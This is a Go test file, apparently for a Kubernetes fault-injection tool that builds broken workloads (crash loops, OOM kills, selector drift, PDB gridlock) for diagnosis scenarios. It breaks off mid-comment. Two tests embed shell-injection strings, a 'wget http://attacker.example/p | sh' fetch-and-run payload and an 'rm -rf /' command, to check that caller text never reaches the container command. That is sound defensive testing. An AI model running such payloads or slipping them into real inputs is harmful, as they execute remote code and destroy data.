// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package kubestate

import (
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"strconv"
	"strings"
	"testing"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	policyv1 "k8s.io/api/policy/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/fake"

	"github.com/go-steer/simian-agent/pkg/catalog"
)

// testSynthesis is the identity the driver hands a builder. Fixed rather than
// derived, so a test can assert on the names a bundle wires its objects
// together with.
func testSynthesis(spec map[string]any) synthesis {
	return synthesis{name: "workload", namespace: "arena-1", replicas: 1, spec: spec, now: testNow}
}

// testNow is the frozen clock CertExpiry's certificates are dated from, so a
// test can assert on notAfter rather than on a window around it.
var testNow = time.Date(2026, 9, 4, 12, 0, 0, 0, time.UTC)

func bundle(t *testing.T, kind string, spec map[string]any) []runtime.Object {
	t.Helper()
	objs, err := builders[kind](testSynthesis(spec))
	if err != nil {
		t.Fatalf("build %s: %v", kind, err)
	}
	return objs
}

// build returns the pod spec carried by the bundle's Deployment, for the kinds
// whose whole fault is one workload.
func build(t *testing.T, kind string, spec map[string]any) corev1.PodSpec {
	t.Helper()
	for _, obj := range bundle(t, kind, spec) {
		if d, ok := obj.(*appsv1.Deployment); ok {
			return d.Spec.Template.Spec
		}
	}
	t.Fatalf("build %s: bundle contains no Deployment", kind)
	return corev1.PodSpec{}
}

func buildErr(t *testing.T, kind string, spec map[string]any) error {
	t.Helper()
	if _, err := builders[kind](testSynthesis(spec)); err != nil {
		return err
	}
	t.Fatalf("build %s with spec %v succeeded, want error", kind, spec)
	return nil
}

func TestImageUnresolvablePod(t *testing.T) {
	ps := build(t, KindImageUnresolvable, nil)
	c := ps.Containers[0]
	if c.Image != defaultBadImage {
		t.Errorf("image = %q, want %q", c.Image, defaultBadImage)
	}
	// PullIfNotPresent would let a warm image cache on one node silently heal
	// the fault, so the same manifest would land or not depending on where the
	// scheduler put the pod.
	if c.ImagePullPolicy != corev1.PullAlways {
		t.Errorf("pull policy = %q, want %q", c.ImagePullPolicy, corev1.PullAlways)
	}
	if got := build(t, KindImageUnresolvable, map[string]any{"image": "example.invalid/x:1"}).Containers[0].Image; got != "example.invalid/x:1" {
		t.Errorf("spec.image ignored: got %q", got)
	}
}

func TestContainerExitLoopPod(t *testing.T) {
	ps := build(t, KindContainerExitLoop, nil)
	c := ps.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("image = %q, want %q", c.Image, defaultRunnerImage)
	}
	cmd := strings.Join(c.Command, " ")
	if !strings.Contains(cmd, "exit 1") {
		t.Errorf("command %q does not exit non-zero", cmd)
	}
	var msg string
	for _, e := range c.Env {
		if e.Name == exitMessageEnv {
			msg = e.Value
		}
	}
	if msg != defaultExitMessage {
		t.Errorf("%s = %q, want %q", exitMessageEnv, msg, defaultExitMessage)
	}
}

func TestContainerExitLoopCustomCode(t *testing.T) {
	cmd := strings.Join(build(t, KindContainerExitLoop, map[string]any{"exit_code": float64(137)}).Containers[0].Command, " ")
	if !strings.Contains(cmd, "exit 137") {
		t.Errorf("command %q does not carry the requested exit code", cmd)
	}
}

// The message is caller-supplied text that ends up next to a shell. It has to
// travel as an environment variable; interpolating it into the command string
// is how a scenario pack that wants a specific log line becomes arbitrary
// command execution inside the arena.
func TestContainerExitLoopMessageNeverReachesTheCommand(t *testing.T) {
	evil := `x"; wget http://attacker.example/p | sh; echo "`
	c := build(t, KindContainerExitLoop, map[string]any{"message": evil}).Containers[0]
	cmd := strings.Join(c.Command, " ")
	if strings.Contains(cmd, "wget") || strings.Contains(cmd, evil) {
		t.Fatalf("caller message was interpolated into the command: %q", cmd)
	}
	if c.Env[0].Value != evil {
		t.Errorf("message did not survive as an env value: %q", c.Env[0].Value)
	}
}

func TestContainerExitLoopRejects(t *testing.T) {
	// exit 0 still crash-loops, but the pod reports lastState reason
	// Completed, which poses a different diagnosis than this kind exists for.
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(0)}); !strings.Contains(err.Error(), "non-zero") {
		t.Errorf("exit_code 0: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(256)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("exit_code 256: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(-1)}); err == nil {
		t.Error("negative exit code accepted")
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": "one"}); !strings.Contains(err.Error(), "must be a number") {
		t.Errorf("non-numeric exit_code: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": 1.5}); !strings.Contains(err.Error(), "whole number") {
		t.Errorf("fractional exit_code: %v", err)
	}
}

func TestMemoryLimitSqueezePod(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, nil)
	c := ps.Containers[0]
	want := resource.MustParse(defaultMemoryLimit)
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory limit = %s, want %s", got.String(), want.String())
	}
	// requests == limits, or the pod becomes an eviction candidate under node
	// pressure and the fault sometimes reads as a node problem instead.
	if got := c.Resources.Requests[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory request = %s, want %s", got.String(), want.String())
	}
	// The allocation must be anonymous memory, freed when the process dies. A
	// memory-backed emptyDir belongs to the pod: its pages outlive the
	// container, and the restarted container's runc init is OOM-killed before
	// any of our code runs, so the pod reports StartError and the OOM kill the
	// fault is about is overwritten within seconds. Measured on GKE.
	if len(ps.Volumes) != 0 {
		t.Errorf("pod carries volumes %+v; tmpfs pages survive the restart and turn OOMKilled into StartError", ps.Volumes)
	}
	if len(c.VolumeMounts) != 0 {
		t.Errorf("container mounts %+v, want none", c.VolumeMounts)
	}
	cmd := strings.Join(c.Command, " ")
	if want := strconv.Itoa(defaultMemoryAllocateMB * 1024 * 1024); !strings.Contains(cmd, want) {
		t.Errorf("command %q does not allocate %dMi (%s bytes)", cmd, defaultMemoryAllocateMB, want)
	}
	// If the allocation somehow stays inside the limit the container must
	// idle, not exit: a container that exits crash-loops, and a crash loop is
	// the diagnosis ContainerExitLoop poses.
	if !strings.Contains(cmd, "; sleep") {
		t.Errorf("command %q exits instead of idling when the allocation does not trip the limit", cmd)
	}
}

func TestMemoryLimitSqueezeRejects(t *testing.T) {
	// A container that stays inside its cgroup is never OOMKilled: the fault
	// would apply cleanly and do nothing, which is the failure mode the whole
	// efficacy story exists to prevent.
	err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "256Mi", "allocate_mb": float64(64)})
	if !strings.Contains(err.Error(), "must exceed") {
		t.Errorf("allocation inside the limit: %v", err)
	}
	// Exactly at the limit is not over it.
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "64Mi", "allocate_mb": float64(64)}); err == nil {
		t.Error("allocate_mb exactly equal to the limit was accepted")
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "not-a-quantity"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad quantity: %v", err)
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"allocate_mb": float64(0)}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero allocation: %v", err)
	}
}

func TestMemoryLimitSqueezeCustomSizes(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "16Mi", "allocate_mb": float64(48)})
	c := ps.Containers[0]
	want := resource.MustParse("16Mi")
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("limit = %s, want 16Mi", got.String())
	}
	if !strings.Contains(strings.Join(c.Command, " "), strconv.Itoa(48*1024*1024)) {
		t.Errorf("command does not allocate 48Mi: %v", c.Command)
	}
}

func TestUnschedulablePodByCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, nil)
	got := ps.Containers[0].Resources.Requests[corev1.ResourceCPU]
	want := resource.MustParse(defaultUnschedulableCPU)
	if got.Cmp(want) != 0 {
		t.Errorf("cpu request = %s, want %s", got.String(), want.String())
	}
	// A merely-large request is a provisioning signal: a cluster autoscaler or
	// GKE Node Auto-Provisioning would add a node, the pod would schedule, and
	// the fault would heal partway through the experiment with a machine on
	// the bill. The default has to be beyond any shape a cloud sells.
	if got.Cmp(resource.MustParse("512")) < 0 {
		t.Errorf("default cpu request %s is small enough for an autoscaler to satisfy", got.String())
	}
	if ps.NodeSelector != nil {
		t.Errorf("unexpected node selector %v", ps.NodeSelector)
	}
}

func TestUnschedulablePodByNodeSelector(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"node_selector": map[string]any{"failure-domain.example.com/zone": "nowhere"},
	})
	if ps.NodeSelector["failure-domain.example.com/zone"] != "nowhere" {
		t.Errorf("node selector = %v", ps.NodeSelector)
	}
	// Mutually exclusive with the CPU request: with both set, the
	// FailedScheduling message would name whichever predicate the scheduler
	// happened to evaluate first, and the evidence the agent reads would be
	// non-deterministic.
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("node_selector did not suppress the cpu request: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableNodeSelectorWinsOverRequestCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"request_cpu":   "999",
		"node_selector": map[string]any{"k": "v"},
	})
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("both mechanisms applied: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableRejects(t *testing.T) {
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "lots"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad cpu quantity: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "0"}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero cpu: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": "zone=nowhere"}); !strings.Contains(err.Error(), "must be an object") {
		t.Errorf("scalar node_selector: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": map[string]any{"k": float64(1)}}); !strings.Contains(err.Error(), "must be a string") {
		t.Errorf("non-string node_selector value: %v", err)
	}
}

func TestOptHelpers(t *testing.T) {
	if got := optString(nil, "x", "def"); got != "def" {
		t.Errorf("optString(nil) = %q", got)
	}
	// An empty string is the same as unset: a planner that emits "name": ""
	// must not produce a workload named "-<suffix>".
	if got := optString(map[string]any{"x": ""}, "x", "def"); got != "def" {
		t.Errorf("optString(empty) = %q, want the default", got)
	}
	if got := optString(map[string]any{"x": float64(3)}, "x", "def"); got != "def" {
		t.Errorf("optString(non-string) = %q, want the default", got)
	}
	for _, v := range []any{int(7), int64(7), float64(7)} {
		n, err := optInt(map[string]any{"x": v}, "x", 0)
		if err != nil || n != 7 {
			t.Errorf("optInt(%T) = %d, %v", v, n, err)
		}
	}
	if n, err := optInt(map[string]any{"y": 1}, "x", 5); err != nil || n != 5 {
		t.Errorf("optInt(missing) = %d, %v", n, err)
	}
	if m, err := optStringMap(nil, "x"); err != nil || m != nil {
		t.Errorf("optStringMap(nil) = %v, %v", m, err)
	}
}

// --- the bundle kinds ---

func TestHealthyWorkloadIsTheControl(t *testing.T) {
	ps := build(t, KindNoOp, nil)
	c := ps.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("image = %q, want %q", c.Image, defaultRunnerImage)
	}
	// The control has to be a scenario in every respect except being broken.
	// A control that applied nothing could be scored right by counting
	// objects, and a control whose one workload is subtly wrong is not a
	// control at all.
	if len(bundle(t, KindNoOp, nil)) != 1 {
		t.Errorf("bundle = %d objects, want one Deployment", len(bundle(t, KindNoOp, nil)))
	}
	if c.Resources.Limits != nil || c.Resources.Requests != nil {
		t.Errorf("control workload carries resource constraints: %+v", c.Resources)
	}
	if !strings.Contains(strings.Join(c.Command, " "), "sleep") {
		t.Errorf("control command %q does not idle", c.Command)
	}
}

func jobOf(t *testing.T, spec map[string]any) *batchv1.Job {
	t.Helper()
	for _, obj := range bundle(t, KindJobFailure, spec) {
		if j, ok := obj.(*batchv1.Job); ok {
			return j
		}
	}
	t.Fatal("JobFailure bundle contains no Job")
	return nil
}

func TestJobFailureRunsUntilItGivesUp(t *testing.T) {
	j := jobOf(t, nil)
	if got := *j.Spec.BackoffLimit; got != defaultBackoffLimit {
		t.Errorf("backoffLimit = %d, want %d", got, defaultBackoffLimit)
	}
	// Never, not OnFailure. Under OnFailure the kubelet restarts the container
	// in place, the Job's own backoff never advances, and it crash-loops
	// forever instead of reaching BackoffLimitExceeded — which is the state
	// the efficacy gate reads and the diagnosis this kind exists to pose.
	if got := j.Spec.Template.Spec.RestartPolicy; got != corev1.RestartPolicyNever {
		t.Errorf("restartPolicy = %q, want %q", got, corev1.RestartPolicyNever)
	}
	c := j.Spec.Template.Spec.Containers[0]
	if !strings.Contains(strings.Join(c.Command, " "), "exit 1") {
		t.Errorf("command %q does not exit non-zero", c.Command)
	}
	// The gate selects on app=<name>, and it selects the Job, not its pods.
	if j.Labels["app"] != "workload" || j.Spec.Template.Labels["app"] != "workload" {
		t.Errorf("labels = %v / %v, want app=workload on both", j.Labels, j.Spec.Template.Labels)
	}
}

func TestJobFailureCarriesItsMessageOutOfBandOfTheCommand(t *testing.T) {
	j := jobOf(t, map[string]any{"message": "boom\"; rm -rf /; echo \""})
	c := j.Spec.Template.Spec.Containers[0]
	if strings.Contains(strings.Join(c.Command, " "), "rm -rf") {
		t.Errorf("caller text reached the command: %q", c.Command)
	}
	if c.Env[0].Name != exitMessageEnv || !strings.Contains(c.Env[0].Value, "rm -rf") {
		t.Errorf("message did not travel as an environment variable: %+v", c.Env)
	}
}

func TestJobFailureRejects(t *testing.T) {
	// Exit 0 is the one that would apply cleanly and produce a healthy
	// namespace: the Job succeeds and the scenario has no fault in it.
	if err := buildErr(t, KindJobFailure, map[string]any{"exit_code": float64(0)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("zero exit code: %v", err)
	}
	if err := buildErr(t, KindJobFailure, map[string]any{"exit_code": float64(300)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("out of range exit code: %v", err)
	}
	// The retry delay doubles, so a large limit puts BackoffLimitExceeded
	// hours out and the fault's lease expires long before the gate passes.
	if err := buildErr(t, KindJobFailure, map[string]any{"backoff_limit": float64(maxBackoffLimit + 1)}); !strings.Contains(err.Error(), "backoff_limit") {
		t.Errorf("excessive backoff limit: %v", err)
	}
	if err := buildErr(t, KindJobFailure, map[string]any{"backoff_limit": float64(-1)}); !strings.Contains(err.Error(), "backoff_limit") {
		t.Errorf("negative backoff limit: %v", err)
	}
}

func TestJobFailureAcceptsZeroRetries(t *testing.T) {
	// Zero is a legal limit and the fastest one: the Job fails on its first
	// attempt. Only the *upper* bound is a problem.
	if got := *jobOf(t, map[string]any{"backoff_limit": float64(0)}).Spec.BackoffLimit; got != 0 {
		t.Errorf("backoffLimit = %d, want 0", got)
	}
}

// serviceOf pulls the Service and the Deployment out of the two kinds whose
// fault is the relationship between them.
func serviceOf(t *testing.T, kind string, spec map[string]any) (*corev1.Service, *appsv1.Deployment) {
	t.Helper()
	var svc *corev1.Service
	var dep *appsv1.Deployment
	for _, obj := range bundle(t, kind, spec) {
		switch o := obj.(type) {
		case *corev1.Service:
			svc = o
		case *appsv1.Deployment:
			dep = o
		}
	}
	if svc == nil || dep == nil {
		t.Fatalf("%s bundle = %T, want a Service and a Deployment", kind, bundle(t, kind, spec))
	}
	return svc, dep
}

func TestSelectorDriftPointsTheServicePastItsOwnWorkload(t *testing.T) {
	svc, dep := serviceOf(t, KindSelectorDrift, nil)
	pods := dep.Spec.Template.Labels
	if svc.Spec.Selector["app"] == pods["app"] {
		t.Fatalf("service selects its own pods (%v): there is no fault here", svc.Spec.Selector)
	}
	if got, want := svc.Spec.Selector["app"], "workload"+defaultDriftSuffix; got != want {
		t.Errorf("selector = %q, want %q", got, want)
	}
	// Running and Ready, every one of them. The fault lives between the two
	// objects, and a subject that grades `kubectl get pods` sees nothing.
	if len(dep.Spec.Template.Spec.Containers[0].Command) == 0 {
		t.Error("drifted workload has no command; it must come up healthy")
	}
	if got := svc.Spec.Ports[0].Port; got != defaultServicePort {
		t.Errorf("port = %d, want %d", got, defaultServicePort)
	}
	// The endpointslice half of the gate finds the slices by the Service's
	// name, so the Service has to share the bundle's name.
	if svc.Name != dep.Name {
		t.Errorf("service %q and deployment %q must share the bundle name", svc.Name, dep.Name)
	}
}

func TestSelectorDriftRejects(t *testing.T) {
	// The selector that matches after all is the one that produces a fault
	// which applies cleanly and does nothing.
	if err := buildErr(t, KindSelectorDrift, map[string]any{"selector_value": "workload"}); !strings.Contains(err.Error(), "own label value") {
		t.Errorf("self-selecting drift: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"selector_value": "not a label!"}); !strings.Contains(err.Error(), "not a valid label value") {
		t.Errorf("illegal label value: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"port": float64(0)}); !strings.Contains(err.Error(), "port") {
		t.Errorf("zero port: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"port": float64(70000)}); !strings.Contains(err.Error(), "port") {
		t.Errorf("out of range port: %v", err)
	}
}

func TestUnboundClaimBlocksTheWorkloadBehindTheClaim(t *testing.T) {
	objs := bundle(t, KindUnboundClaim, nil)
	// The claim first. A Deployment whose pod references a claim that does not
	// exist yet reports FailedMount, which is a different fault than the
	// unschedulable pod the gate reads.
	pvc, ok := objs[0].(*corev1.PersistentVolumeClaim)
	if !ok {
		t.Fatalf("first object is %T, want the claim", objs[0])
	}
	dep, ok := objs[1].(*appsv1.Deployment)
	if !ok {
		t.Fatalf("second object is %T, want the Deployment", objs[1])
	}
	// An empty storageClassName means the cluster default, which on a managed
	// cluster is a real provisioner that binds within seconds and heals the
	// fault before the subject ever sees it.
	if pvc.Spec.StorageClassName == nil || *pvc.Spec.StorageClassName != defaultMissingStorageClass {
		t.Errorf("storageClassName = %v, want %q", pvc.Spec.StorageClassName, defaultMissingStorageClass)
	}
	if got := pvc.Spec.Resources.Requests[corev1.ResourceStorage]; got.String() != defaultClaimSize {
		t.Errorf("size = %s, want %s", got.String(), defaultClaimSize)
	}
	vols := dep.Spec.Template.Spec.Volumes
	if len(vols) != 1 || vols[0].PersistentVolumeClaim == nil || vols[0].PersistentVolumeClaim.ClaimName != pvc.Name {
		t.Fatalf("deployment does not mount the claim: %+v", vols)
	}
	if mounts := dep.Spec.Template.Spec.Containers[0].VolumeMounts; len(mounts) != 1 || mounts[0].Name != vols[0].Name {
		t.Errorf("volume is declared but not mounted: %+v", mounts)
	}
}

func TestUnboundClaimRejects(t *testing.T) {
	if err := buildErr(t, KindUnboundClaim, map[string]any{"size": "plenty"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad size: %v", err)
	}
	if err := buildErr(t, KindUnboundClaim, map[string]any{"size": "0"}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero size: %v", err)
	}
	if err := buildErr(t, KindUnboundClaim, map[string]any{"storage_class": "Not A Class"}); !strings.Contains(err.Error(), "not a valid name") {
		t.Errorf("illegal storage class: %v", err)
	}
}

// Every kind this engine advertises has to be creatable. The type switch in
// createObject is the only place that knows how, and a builder returning a
// type it has no case for would pass every builder test and fail at apply
// time, in a cluster, against a scenario that had already provisioned an
// arena.
func TestEveryKindSynthesizesObjectsTheEngineCanCreate(t *testing.T) {
	for _, kind := range Kinds() {
		objs := bundle(t, kind, nil)
		if len(objs) == 0 {
			t.Errorf("%s: bundle is empty", kind)
			continue
		}
		for _, obj := range objs {
			if err := createObject(t.Context(), fake.NewSimpleClientset(), "arena-1", obj); err != nil {
				t.Errorf("%s: create %T: %v", kind, obj, err)
			}
		}
	}
}

func TestDependencyStallLooksHealthyFromEveryAngleButTheLog(t *testing.T) {
	svc, dep := serviceOf(t, KindDependencyStall, nil)
	pod := dep.Spec.Template.Spec
	c := pod.Containers[0]

	// The inverse of SelectorDrift, and it has to be: half of what makes this
	// fault what it is is that the Service in front of it works.
	if got, want := svc.Spec.Selector["app"], dep.Spec.Template.Labels["app"]; got != want {
		t.Errorf("service selects %q, pods are labelled %q: this kind's Service must select its own pods", got, want)
	}
	if svc.Name != dep.Name {
		t.Errorf("service %q and deployment %q must share the bundle name", svc.Name, dep.Name)
	}

	// Ready has to mean something. A pod with no readiness probe is Ready the
	// moment its process starts, so a subject that dialled the Service would
	// get a refused connection and correctly report the workload down — which
	// is a different diagnosis than the one this kind poses.
	rp := c.ReadinessProbe
	if rp == nil || rp.HTTPGet == nil {
		t.Fatalf("readiness probe = %v, want an HTTP GET: without one the workload is Ready without serving", rp)
	}
	if got := rp.HTTPGet.Port.IntValue(); got != defaultServicePort {
		t.Errorf("readiness probe port = %d, want the served port %d", got, defaultServicePort)
	}
	if len(c.Ports) == 0 || c.Ports[0].ContainerPort != defaultServicePort {
		t.Errorf("container ports = %v, want the served port declared", c.Ports)
	}
	if got := svc.Spec.Ports[0].TargetPort.IntValue(); got != defaultServicePort {
		t.Errorf("service targetPort = %d, want the served port", got)
	}

	// Nothing else about the workload may be wrong. Each of these would give a
	// subject a field to find the fault in, and the kind would stop measuring
	// what it exists to measure.
	if len(c.Resources.Limits) != 0 || len(c.Resources.Requests) != 0 {
		t.Errorf("resources = %v, want none: a limit is something a diagnosis can read off the object", c.Resources)
	}
	if pod.NodeSelector != nil {
		t.Errorf("nodeSelector = %v, want none", pod.NodeSelector)
	}
	if len(pod.Volumes) != 0 {
		t.Errorf("volumes = %v, want none", pod.Volumes)
	}
	if pod.RestartPolicy != "" {
		t.Errorf("restartPolicy = %q, want the default", pod.RestartPolicy)
	}
}

func TestDependencyStallCarriesItsMessageOutOfBandOfTheCommand(t *testing.T) {
	_, dep := serviceOf(t, KindDependencyStall, nil)
	c := dep.Spec.Template.Spec.Containers[0]

	var msg string
	for _, e := range c.Env {
		if e.Name == stallMessageEnv {
			msg = e.Value
		}
	}
	if msg != catalog.KubeStateDefaultStallMessage {
		t.Errorf("env %s = %q, want the catalog's default line", stallMessageEnv, msg)
	}
	// The gate greps for exactly this string, and computes it from the same
	// spec through the same function. If the driver stopped resolving it the
	// catalog's way, the fault would land and the gate would look for a line
	// nothing wrote.
	if got := catalog.KubeStateStallMessage(""); got != msg {
		t.Errorf("the gate will look for %q, the container writes %q", got, msg)
	}

	cmd := strings.Join(c.Command, " ")
	if strings.Contains(cmd, msg) {
		t.Errorf("the message is interpolated into the command: %q", cmd)
	}
	if !strings.Contains(cmd, "$"+stallMessageEnv) {
		t.Errorf("command %q does not reference the message variable", cmd)
	}
	// httpd first and the log loop second, joined so a failure to bind stops
	// the chain. A container that logged without serving would fail its own
	// readiness gate, which is the right direction to fail in.
	if i, j := strings.Index(cmd, "httpd"), strings.Index(cmd, "while"); i < 0 || j < 0 || i > j {
		t.Errorf("command %q must start the server before the log loop", cmd)
	}

	custom := "level=error upstream=ledger err=\"connection refused\""
	_, dep = serviceOf(t, KindDependencyStall, map[string]any{"message": custom})
	if got := dep.Spec.Template.Spec.Containers[0].Env[0].Value; got != custom {
		t.Errorf("custom message = %q, want %q", got, custom)
	}
}

func TestDependencyStallRejects(t *testing.T) {
	// A multi-line message is written as several lines, and the gate matches
	// against one. The fault would land and be reported as inert.
	if err := buildErr(t, KindDependencyStall, map[string]any{"message": "one\ntwo"}); !strings.Contains(err.Error(), "single line") {
		t.Errorf("multi-line message: %v", err)
	}
	// Whitespace is not a message. The gate is a substring match, and almost
	// every log line contains a space.
	if _, dep := serviceOf(t, KindDependencyStall, map[string]any{"message": "   "}); dep.Spec.Template.Spec.Containers[0].Env[0].Value != catalog.KubeStateDefaultStallMessage {
		t.Error("a whitespace-only message must fall back to the default, not become a gate that matches everything")
	}
	for _, tc := range []struct {
		name string
		spec map[string]any
		want string
	}{
		{"zero interval", map[string]any{"interval_seconds": float64(0)}, "interval_seconds"},
		{"interval past the gate's timeout", map[string]any{"interval_seconds": float64(600)}, "interval_seconds"},
		{"zero port", map[string]any{"port": float64(0)}, "port"},
		{"out of range port", map[string]any{"port": float64(70000)}, "port"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := buildErr(t, KindDependencyStall, tc.spec); !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want it to name %q", err, tc.want)
			}
		})
	}
}

// --- PDBGridlock ---

// pdbOf returns the budget and the workload it covers.
func pdbOf(t *testing.T, spec map[string]any) (*policyv1.PodDisruptionBudget, *appsv1.Deployment) {
	t.Helper()
	var (
		pdb *policyv1.PodDisruptionBudget
		dep *appsv1.Deployment
	)
	for _, obj := range bundle(t, KindPDBGridlock, spec) {
		switch o := obj.(type) {
		case *policyv1.PodDisruptionBudget:
			pdb = o
		case *appsv1.Deployment:
			dep = o
		}
	}
	if pdb == nil || dep == nil {
		t.Fatalf("bundle is missing the budget or the workload: pdb=%v dep=%v", pdb, dep)
	}
	return pdb, dep
}

func TestPDBGridlockLeavesNoHeadroom(t *testing.T) {
	pdb, dep := pdbOf(t, nil)

	// The budget has to cover the fault's own pods and nothing else. A broader
	// selector would block eviction of workloads Simian did not create, which
	// is outside the blast radius this kind is classified at.
	if got, want := pdb.Spec.Selector.MatchLabels["app"], dep.Spec.Template.Labels["app"]; got != want {
		t.Errorf("budget selects %q, the pods are labelled %q", got, want)
	}
	if pdb.Name != dep.Name {
		t.Errorf("budget %q and deployment %q must share the bundle name", pdb.Name, dep.Name)
	}
	if pdb.Spec.MaxUnavailable != nil {
		t.Errorf("maxUnavailable = %v, want it unset: this kind states the floor, not the ceiling", pdb.Spec.MaxUnavailable)
	}
	// minAvailable == replicas is the whole fault. Anything lower and the
	// budget permits a disruption, the pods can be evicted, and a drain
	// completes normally.
	if pdb.Spec.MinAvailable == nil {
		t.Fatal("minAvailable is unset: the budget would block nothing")
	}
	if got, want := pdb.Spec.MinAvailable.IntValue(), int(*dep.Spec.Replicas); got != want {
		t.Errorf("minAvailable = %d, replicas = %d: the two must be equal or the budget leaves headroom", got, want)
	}

	// And nothing about the workload may be wrong. Like SelectorDrift and
	// DependencyStall, this kind's difficulty is that every pod is fine.
	c := dep.Spec.Template.Spec.Containers[0]
	if len(c.Resources.Limits) != 0 || len(c.Resources.Requests) != 0 {
		t.Errorf("resources = %v, want none", c.Resources)
	}
	if dep.Spec.Template.Spec.NodeSelector != nil {
		t.Errorf("nodeSelector = %v, want none", dep.Spec.Template.Spec.NodeSelector)
	}
}

func TestPDBGridlockAcceptsAMinAvailableAboveTheReplicaCount(t *testing.T) {
	// Above is fine and is a real shape: a budget written for a Deployment that
	// has since been scaled down. currentHealthy stays below desiredHealthy, so
	// disruptionsAllowed is zero for the same reason.
	pdb, _ := pdbOf(t, map[string]any{"min_available": float64(3)})
	if got := pdb.Spec.MinAvailable.IntValue(); got != 3 {
		t.Errorf("minAvailable = %d, want 3", got)
	}
}

func TestPDBGridlockRejects(t *testing.T) {
	// Zero permits every eviction. The fault would apply cleanly and block
	// nothing, which is the vacuous pass the gates exist to refuse.
	if err := buildErr(t, KindPDBGridlock, map[string]any{"min_available": float64(0)}); !strings.Contains(err.Error(), "at least 1") {
		t.Errorf("zero min_available: %v", err)
	}
	// Below the replica count leaves headroom, which is the same failure one
	// step less obvious. testSynthesis uses one replica, so this needs a
	// two-replica synthesis to be expressible at all.
	s := testSynthesis(map[string]any{"min_available": float64(1)})
	s.replicas = 2
	_, err := builders[KindPDBGridlock](s)
	if err == nil || !strings.Contains(err.Error(), "at least spec.replicas") {
		t.Errorf("min_available below replicas: %v", err)
	}
	// It is a pod count. Anything past the cap on replicas is a typo, and an
	// unbounded one does not survive the conversion to the int32 the API takes.
	if err := buildErr(t, KindPDBGridlock, map[string]any{"min_available": float64(maxReplicas + 1)}); !strings.Contains(err.Error(), "at most") {
		t.Errorf("min_available above the cap: %v", err)
	}
}

// --- RolloutStuck ---

func TestRolloutStuckKeepsTheOldRevisionServing(t *testing.T) {
	objs := bundle(t, KindRolloutStuck, nil)
	if len(objs) != 1 {
		t.Fatalf("bundle has %d objects, want just the Deployment: the second revision is applied by the finisher", len(objs))
	}
	dep, ok := objs[0].(*appsv1.Deployment)
	if !ok {
		t.Fatalf("object is %T, want the Deployment", objs[0])
	}

	// maxUnavailable 0 is what makes this fault user-invisible: the controller
	// will not take an old pod down until a new one is ready, and none ever
	// will be. Anything else and the stall shows up as lost capacity, which is
	// a diagnosis half this engine already poses.
	ru := dep.Spec.Strategy.RollingUpdate
	if dep.Spec.Strategy.Type != appsv1.RollingUpdateDeploymentStrategyType || ru == nil {
		t.Fatalf("strategy = %+v, want a rolling update", dep.Spec.Strategy)
	}
	if got := ru.MaxUnavailable.IntValue(); got != 0 {
		t.Errorf("maxUnavailable = %d, want 0: the previous revision must keep every replica", got)
	}
	if got := ru.MaxSurge.IntValue(); got != 1 {
		t.Errorf("maxSurge = %d, want 1: the new revision needs exactly one pod to fail in", got)
	}

	// The Kubernetes default of 600s is ten minutes of the fault's own lease
	// spent waiting for a condition it has already caused, and the gate would
